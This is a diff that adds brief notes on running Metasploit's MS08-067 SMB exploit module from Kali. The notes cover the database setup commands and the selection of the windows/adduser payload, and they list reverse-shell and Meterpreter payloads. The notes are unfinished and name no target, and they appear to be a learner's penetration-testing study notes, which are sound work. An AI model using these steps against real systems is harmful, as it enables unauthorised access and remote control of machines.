@@ -61,4 +61,34 @@
 IP --> All IP Address discussed can be public or private IP
 
 
+########## Start Working on MetaSploit FrameWork ################
+
+Path : usr/share/metasploit-framework/modules/exploits/windows
+Exploit Code in MetaSploit : /usr/share/metasploit-framework/modules/exploits/windows/smb/ms08_067_netapi.rb
+
+1. Run service in the terminal : root@kali:~# service postgresql start
+2. root@kali:~# service postgresql status  ---> Check the status of the service
+3. root@kali:~# msfdb reinit  ---> reinitalizing the database and purging all the database 
+4. root@kali:~# msfconsole  ---> Launch in the console 
+5. command in the another terminal file
+6. after exploit use show options command (msf exploit(windows/smb/ms08_067_netapi) > show options)
+7. msf exploit(windows/smb/ms08_067_netapi) > set payload windows/adduser
+8. msf exploit(windows/smb/ms08_067_netapi) > show options
+9. 
+
+
+#### PayLoads :
+
+1. windows/adduser (Payload) : 
+2. windows/shell/reverse_tcp
+3. windows/vncinject/reverse_tcp
+4. windows/meterpreter/reverse_tcp
+
+
+
+
+
+
+
+
 
